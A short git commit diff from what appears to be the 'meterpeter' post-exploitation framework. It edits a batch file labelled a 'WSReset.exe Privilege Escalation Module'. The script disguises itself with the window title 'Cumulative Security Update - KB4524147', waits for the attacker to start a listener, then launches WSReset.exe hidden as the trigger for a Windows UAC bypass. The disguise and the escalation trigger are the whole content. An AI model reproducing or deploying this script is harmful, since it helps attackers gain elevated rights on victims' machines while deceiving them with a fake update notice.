bdc863dda235d283034fec3fa497b7b40f81b9c5
pedro ubuntu <r00t-3xp10it@users.noreply.github.com>
2020-03-13 20:17:02 +0000

    Update trigger.bat
    WSReset.exe Privilege Escalation Module

--- mimiRatz/trigger.bat
+++ mimiRatz/trigger.bat
@@ -1,6 +1,8 @@
 @echo off
+:: Framework: meterpeter v2.8
 title Cumulative Security Update - KB4524147
 :: Sleep 2 minutes to have time to start handler
 powershell Start-Sleep -Seconds 120
 :: Start Vulnerable Process Binary
-powershell Start-Process -FilePath "$env:windir\System32\WSReset.exe" -WindowStyle Hidden;
+powershell Start-Process -FilePath "$env:windir\System32\WSReset.exe" -WindowStyle Hidden
+exit
